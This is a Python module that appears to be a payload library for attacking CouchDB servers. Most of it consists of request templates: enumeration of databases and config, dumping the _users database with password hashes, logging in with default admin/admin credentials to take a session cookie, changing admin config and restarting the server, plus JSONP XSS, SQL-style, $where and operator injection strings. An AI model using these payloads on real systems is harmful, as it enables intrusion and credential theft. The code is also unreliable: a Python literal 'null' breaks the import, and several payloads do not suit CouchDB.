"""
CouchDB 注入載荷模塊
包含針對CouchDB的各種注入載荷，用於CouchDB API和URL參數的漏洞利用
"""

import json

# CouchDB基本信息獲取
BASIC_INFO_PAYLOADS = [
    {
        "name": "獲取服務器信息",
        "value": "/",
        "description": "獲取CouchDB服務器基本信息",
        "method": "GET",
        "category": "info"
    },
    {
        "name": "查詢所有數據庫",
        "value": "/_all_dbs",
        "description": "獲取所有數據庫列表",
        "method": "GET",
        "category": "info"
    },
    {
        "name": "獲取活動任務",
        "value": "/_active_tasks",
        "description": "獲取當前活動任務",
        "method": "GET",
        "category": "info"
    },
    {
        "name": "獲取配置",
        "value": "/_config",
        "description": "獲取CouchDB配置信息",
        "method": "GET",
        "category": "info"
    },
    {
        "name": "獲取日誌",
        "value": "/_log",
        "description": "獲取CouchDB日誌信息",
        "method": "GET",
        "category": "info"
    },
    {
        "name": "獲取統計信息",
        "value": "/_stats",
        "description": "獲取CouchDB統計信息",
        "method": "GET",
        "category": "info"
    }
]

# CouchDB數據庫操作
DATABASE_OPERATIONS = [
    {
        "name": "查詢數據庫信息",
        "value": "/{db}",
        "description": "獲取指定數據庫的信息",
        "method": "GET",
        "category": "database",
        "requires_db": True
    },
    {
        "name": "創建數據庫",
        "value": "/{db}",
        "description": "創建新數據庫",
        "method": "PUT",
        "category": "database",
        "requires_db": True
    },
    {
        "name": "刪除數據庫",
        "value": "/{db}",
        "description": "刪除指定數據庫",
        "method": "DELETE",
        "category": "database",
        "requires_db": True
    },
    {
        "name": "查詢所有文檔",
        "value": "/{db}/_all_docs",
        "description": "獲取數據庫中的所有文檔",
        "method": "GET",
        "category": "database",
        "requires_db": True
    },
    {
        "name": "批量獲取文檔",
        "value": "/{db}/_all_docs?include_docs=true",
        "description": "獲取數據庫中的所有文檔(包含完整內容)",
        "method": "GET",
        "category": "database",
        "requires_db": True
    },
    {
        "name": "查詢設計文檔",
        "value": "/{db}/_design_docs",
        "description": "獲取所有設計文檔",
        "method": "GET",
        "category": "database",
        "requires_db": True
    },
    {
        "name": "獲取變更",
        "value": "/{db}/_changes",
        "description": "獲取數據庫變更信息",
        "method": "GET",
        "category": "database",
        "requires_db": True
    }
]

# CouchDB文檔操作
DOCUMENT_OPERATIONS = [
    {
        "name": "查詢文檔",
        "value": "/{db}/{doc_id}",
        "description": "獲取指定文檔",
        "method": "GET",
        "category": "document",
        "requires_db": True,
        "requires_doc_id": True
    },
    {
        "name": "創建文檔",
        "value": "/{db}/{doc_id}",
        "data": {"field1": "value1", "field2": "value2"},
        "description": "創建或更新指定文檔",
        "method": "PUT",
        "category": "document",
        "requires_db": True,
        "requires_doc_id": True
    },
    {
        "name": "刪除文檔",
        "value": "/{db}/{doc_id}?rev={rev}",
        "description": "刪除指定文檔(需要revision)",
        "method": "DELETE",
        "category": "document",
        "requires_db": True,
        "requires_doc_id": True,
        "requires_rev": True
    },
    {
        "name": "查詢文檔修訂版本",
        "value": "/{db}/{doc_id}?revs=true",
        "description": "獲取文檔的所有修訂版本",
        "method": "GET",
        "category": "document",
        "requires_db": True,
        "requires_doc_id": True
    }
]

# CouchDB視圖和查詢
VIEW_QUERY_OPERATIONS = [
    {
        "name": "執行視圖",
        "value": "/{db}/_design/{design_doc}/_view/{view_name}",
        "description": "執行指定設計文檔中的視圖",
        "method": "GET",
        "category": "view",
        "requires_db": True,
        "requires_design_doc": True,
        "requires_view_name": True
    },
    {
        "name": "查詢視圖附加參數",
        "value": "/{db}/_design/{design_doc}/_view/{view_name}?limit=10&skip=0&descending=true",
        "description": "帶有附加參數的視圖查詢",
        "method": "GET",
        "category": "view",
        "requires_db": True,
        "requires_design_doc": True,
        "requires_view_name": True
    },
    {
        "name": "Mango查詢",
        "value": "/{db}/_find",
        "data": {
            "selector": {"field1": {"$eq": "value1"}},
            "fields": ["_id", "field1", "field2"],
            "limit": 10
        },
        "description": "使用Mango查詢語法搜索文檔",
        "method": "POST",
        "category": "query",
        "requires_db": True
    },
    {
        "name": "索引查詢",
        "value": "/{db}/_index",
        "description": "獲取數據庫中的所有索引",
        "method": "GET",
        "category": "query",
        "requires_db": True
    },
    {
        "name": "創建索引",
        "value": "/{db}/_index",
        "data": {
            "index": {"fields": ["field1", "field2"]},
            "name": "field1-field2-index",
            "type": "json"
        },
        "description": "創建新索引",
        "method": "POST",
        "category": "query",
        "requires_db": True
    }
]

# CouchDB用戶和認證
USER_AUTH_OPERATIONS = [
    {
        "name": "查詢用戶",
        "value": "/_users/_all_docs?include_docs=true",
        "description": "獲取所有用戶文檔",
        "method": "GET",
        "category": "user"
    },
    {
        "name": "查詢特定用戶",
        "value": "/_users/org.couchdb.user:{username}",
        "description": "獲取指定用戶的文檔",
        "method": "GET",
        "category": "user",
        "requires_username": True
    },
    {
        "name": "創建用戶",
        "value": "/_users/org.couchdb.user:{username}",
        "data": {
            "name": "{username}",
            "password": "{password}",
            "roles": [],
            "type": "user"
        },
        "description": "創建新用戶",
        "method": "PUT",
        "category": "user",
        "requires_username": True,
        "requires_password": True
    },
    {
        "name": "認證會話",
        "value": "/_session",
        "data": {
            "name": "{username}",
            "password": "{password}"
        },
        "description": "創建新的認證會話",
        "method": "POST",
        "category": "auth",
        "requires_username": True,
        "requires_password": True
    },
    {
        "name": "獲取當前會話",
        "value": "/_session",
        "description": "獲取當前會話信息",
        "method": "GET",
        "category": "auth"
    },
    {
        "name": "登出會話",
        "value": "/_session",
        "description": "刪除當前會話",
        "method": "DELETE",
        "category": "auth"
    }
]

# CouchDB特權操作
ADMIN_OPERATIONS = [
    {
        "name": "獲取配置",
        "value": "/_config",
        "description": "獲取CouchDB配置",
        "method": "GET",
        "category": "admin"
    },
    {
        "name": "獲取特定配置部分",
        "value": "/_config/{section}",
        "description": "獲取特定配置部分",
        "method": "GET",
        "category": "admin",
        "requires_section": True
    },
    {
        "name": "獲取配置項",
        "value": "/_config/{section}/{key}",
        "description": "獲取特定配置項",
        "method": "GET",
        "category": "admin",
        "requires_section": True,
        "requires_key": True
    },
    {
        "name": "設置配置項",
        "value": "/_config/{section}/{key}",
        "data": "\"{value}\"",
        "description": "設置特定配置項",
        "method": "PUT",
        "category": "admin",
        "requires_section": True,
        "requires_key": True,
        "requires_value": True
    },
    {
        "name": "刪除配置項",
        "value": "/_config/{section}/{key}",
        "description": "刪除特定配置項",
        "method": "DELETE",
        "category": "admin",
        "requires_section": True,
        "requires_key": True
    },
    {
        "name": "重啟服務器",
        "value": "/_restart",
        "description": "重啟CouchDB服務器",
        "method": "POST",
        "category": "admin"
    },
    {
        "name": "服務器狀態",
        "value": "/_up",
        "description": "檢查服務器是否運行",
        "method": "GET",
        "category": "admin"
    }
]

# CouchDB攻擊向量
ATTACK_VECTORS = [
    {
        "name": "獲取用戶信息",
        "value": "/_users/_all_docs?include_docs=true",
        "description": "嘗試獲取所有用戶信息(包括密碼哈希)",
        "method": "GET",
        "category": "attack"
    },
    {
        "name": "獲取配置",
        "value": "/_config",
        "description": "嘗試獲取配置信息(可能包含敏感信息)",
        "method": "GET",
        "category": "attack"
    },
    {
        "name": "查詢系統數據庫",
        "value": ["/_users", "/_replicator", "/_global_changes"],
        "description": "嘗試訪問系統數據庫",
        "method": "GET",
        "category": "attack"
    },
    {
        "name": "匿名創建數據庫",
        "value": "/test_db",
        "description": "嘗試創建測試數據庫(測試權限)",
        "method": "PUT",
        "category": "attack"
    },
    {
        "name": "查詢設計文檔",
        "value": "/{db}/_design_docs",
        "description": "獲取可能包含業務邏輯的設計文檔",
        "method": "GET",
        "category": "attack",
        "requires_db": True
    },
    {
        "name": "提取認證cookie",
        "value": "/_session",
        "data": {
            "name": "admin",
            "password": "admin"
        },
        "description": "使用默認憑據嘗試認證並提取cookie",
        "method": "POST",
        "category": "attack"
    }
]

# CouchDB URL參數注入
URL_PARAMETER_INJECTIONS = [
    {
        "name": "JSONP注入",
        "value": "/_all_dbs?callback=alert(1)",
        "description": "JSONP回調XSS注入",
        "method": "GET",
        "category": "url"
    },
    {
        "name": "文檔ID注入",
        "value": "/{db}/ANY'%20OR%20'1'='1",
        "description": "文檔ID SQL語法嘗試注入",
        "method": "GET",
        "category": "url",
        "requires_db": True
    },
    {
        "name": "視圖函數注入",
        "value": "/{db}/_design/doc/_view/ANY'%20OR%20'1'='1",
        "description": "視圖名稱SQL語法嘗試注入",
        "method": "GET",
        "category": "url",
        "requires_db": True
    }
]

# CouchDB JSON注入
JSON_PARAMETER_INJECTIONS = [
    {
        "name": "Mango查詢注入",
        "value": {
            "selector": {"$where": "function() { return true; }"},
            "limit": 1000
        },
        "description": "在Mango查詢中嘗試JavaScript注入",
        "method": "POST",
        "endpoint": "/{db}/_find",
        "category": "json",
        "requires_db": True
    },
    {
        "name": "批量更新注入",
        "value": {
            "docs": [
                {"_id": "doc1", "_rev": "1-rev", "payload": {"$ne": null}},
                {"_id": "doc2", "_rev": "1-rev", "payload": {"$gt": ""}}
            ]
        },
        "description": "在批量更新中注入MongoDB風格的操作符",
        "method": "POST",
        "endpoint": "/{db}/_bulk_docs",
        "category": "json",
        "requires_db": True
    }
]

# 用於構建CouchDB URL和請求的輔助函數
def build_url(base_url, db=None, doc_id=None, design_doc=None, view_name=None, endpoint=None, params=None):
    """
    構建CouchDB請求URL
    
    Args:
        base_url (str): 基礎URL，如http://localhost:5984
        db (str, optional): 數據庫名稱
        doc_id (str, optional): 文檔ID
        design_doc (str, optional): 設計文檔名稱
        view_name (str, optional): 視圖名稱
        endpoint (str, optional): 特定端點
        params (dict, optional): URL參數
        
    Returns:
        str: 完整URL
    """
    url = base_url.rstrip('/')
    
    if db:
        url += f"/{db}"
    
    if design_doc and view_name:
        url += f"/_design/{design_doc}/_view/{view_name}"
    elif doc_id:
        url += f"/{doc_id}"
    
    if endpoint:
        url += f"/{endpoint.lstrip('/')}"
    
    if params:
        param_str = '&'.join([f"{key}={value}" for key, value in params.items()])
        url += f"?{param_str}"
    
    return url

def build_auth_payload(username, password):
    """
    構建CouchDB認證載荷
    
    Args:
        username (str): 用戶名
        password (str): 密碼
        
    Returns:
        dict: 認證載荷
    """
    return {
        "name": username,
        "password": password
    }

def build_user_doc(username, password, roles=None):
    """
    構建CouchDB用戶文檔
    
    Args:
        username (str): 用戶名
        password (str): 密碼
        roles (list, optional): 角色列表
        
    Returns:
        dict: 用戶文檔
    """
    if roles is None:
        roles = []
        
    return {
        "_id": f"org.couchdb.user:{username}",
        "name": username,
        "password": password,
        "roles": roles,
        "type": "user"
    }

def get_reconnaissance_payloads():
    """
    獲取用於偵察的CouchDB載荷
    
    Returns:
        list: 偵察載荷列表
    """
    return [
        {"method": "GET", "endpoint": "/"},
        {"method": "GET", "endpoint": "/_all_dbs"},
        {"method": "GET", "endpoint": "/_active_tasks"},
        {"method": "GET", "endpoint": "/_stats"},
        {"method": "GET", "endpoint": "/_users/_all_docs?include_docs=true"}
    ] 